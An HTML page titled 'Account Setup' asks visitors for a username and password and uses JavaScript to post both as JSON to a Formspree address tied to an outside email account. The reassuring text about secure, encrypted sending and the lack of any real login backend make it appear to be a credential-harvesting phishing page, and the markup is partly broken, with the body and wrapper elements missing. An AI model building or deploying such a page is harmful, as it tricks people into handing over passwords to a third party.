<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Account Setup</title>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@900&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f0f4f8;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      padding: 1rem;
    }

    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
      padding: 2.5rem 2rem;
      width: 100%;
      max-width: 420px;
    }

    .logo-area {
      text-align: center;
      margin-bottom: 2rem;
    }

    .logo-area img.brand-logo {
      width: 100%;
      max-width: 160px;
      height: auto;
      margin-bottom: 1.25rem;
    }

    h1 {
      font-size: 1.5rem;
      font-weight: 700;
      color: #1a202c;
      text-align: center;
    }

    .subtitle {
      text-align: center;
      color: #718096;
      font-size: 0.9rem;
      margin-top: 0.25rem;
    }

    .form-group {
      margin-top: 1.5rem;
    }

    label {
      display: block;
      font-size: 0.875rem;
      font-weight: 600;
      color: #4a5568;
      margin-bottom: 0.4rem;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 0.65rem 0.9rem;
      border: 1.5px solid #cbd5e0;
      border-radius: 8px;
      font-size: 1rem;
      color: #2d3748;
      background: #f7fafc;
      transition: border-color 0.2s, box-shadow 0.2s;
      outline: none;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #4f83cc;
      box-shadow: 0 0 0 3px rgba(79,131,204,0.15);
      background: #fff;
    }

    .password-wrapper {
      position: relative;
    }

    .toggle-pw {
      position: absolute;
      right: 0.75rem;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #a0aec0;
      padding: 0;
      display: flex;
      align-items: center;
    }

    .toggle-pw:hover { color: #4a5568; }

    button[type="submit"] {
      margin-top: 2rem;
      width: 100%;
      padding: 0.75rem;
      background: #2b6cb0;
      color: #fff;
      font-size: 1rem;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }

    button[type="submit"]:hover  { background: #2c5282; }
    button[type="submit"]:active { transform: scale(0.98); }
    button[type="submit"]:disabled {
      background: #a0aec0;
      cursor: not-allowed;
    }

    #status-msg {
      margin-top: 1.25rem;
      padding: 0.75rem 1rem;
      border-radius: 8px;
      font-size: 0.9rem;
      font-weight: 500;
      display: none;
      text-align: center;
    }

    #status-msg.success {
      background: #c6f6d5;
      color: #276749;
      display: block;
    }

    #status-msg.error {
      background: #fed7d7;
      color: #c53030;
      display: block;
    }

    .note {
      margin-top: 1.5rem;
      font-size: 0.78rem;
      color: #a0aec0;
      text-align: center;
      line-height: 1.5;
    }
  </style>
</head>

    <h1>Account Setup</h1>
    <p class="subtitle">Submit your requested credentials below</p>
  </div>

  <form id="setup-form">
    <div class="form-group">
      <label for="username">User Name</label>
      <input type="text" id="username" name="username"
             placeholder="Enter user name" required autocomplete="username" />
    </div>

    <div class="form-group">
      <label for="password">Password</label>
      <div class="password-wrapper">
        <input type="password" id="password" name="password"
               placeholder="Enter password" required autocomplete="new-password" />
        <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Toggle password visibility">
          <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
    </div>

    <button type="submit" id="submit-btn">Send</button>
    <div id="status-msg"></div>
  </form>

  <p class="note">This form is encrypted in transit. Your information will be sent securely.</p>
</div>

<script>
  // Toggle password visibility
  document.getElementById('toggle-pw').addEventListener('click', function () {
    const pw = document.getElementById('password');
    const icon = document.getElementById('eye-icon');
    if (pw.type === 'password') {
      pw.type = 'text';
      icon.innerHTML = `
        <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20C5 20 1 12 1 12a18.9 18.9 0 0 1 5.06-6.06"/>
        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
        <line x1="1" y1="1" x2="23" y2="23"/>`;
    } else {
      pw.type = 'password';
      icon.innerHTML = `
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
        <circle cx="12" cy="12" r="3"/>`;
    }
  });

  // Form submission via Formspree
  document.getElementById('setup-form').addEventListener('submit', async function (e) {
    e.preventDefault();
    const btn = document.getElementById('submit-btn');
    const msg = document.getElementById('status-msg');

    btn.disabled = true;
    btn.textContent = 'Sending...';
    msg.className = '';
    msg.style.display = 'none';

    const data = {
      username: document.getElementById('username').value,
      password: document.getElementById('password').value,
    };

    try {
      // IMPORTANT: Replace YOUR_FORM_ID below with your Formspree form ID.
      // Sign up at https://formspree.io, create a new form, copy the ID from the endpoint URL.
      const response = await fetch('https://formspree.io/jason@margintek.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        msg.textContent = 'Your information was sent successfully.';
        msg.className = 'success';
        document.getElementById('setup-form').reset();
      } else {
        const err = await response.json();
        throw new Error(err.error || 'Submission failed');
      }
    } catch (err) {
      msg.textContent = 'Something went wrong. Please try again or contact support.';
      msg.className = 'error';
      btn.disabled = false;
      btn.textContent = 'Send';
      return;
    }

    btn.textContent = 'Sent';
  });
</script>
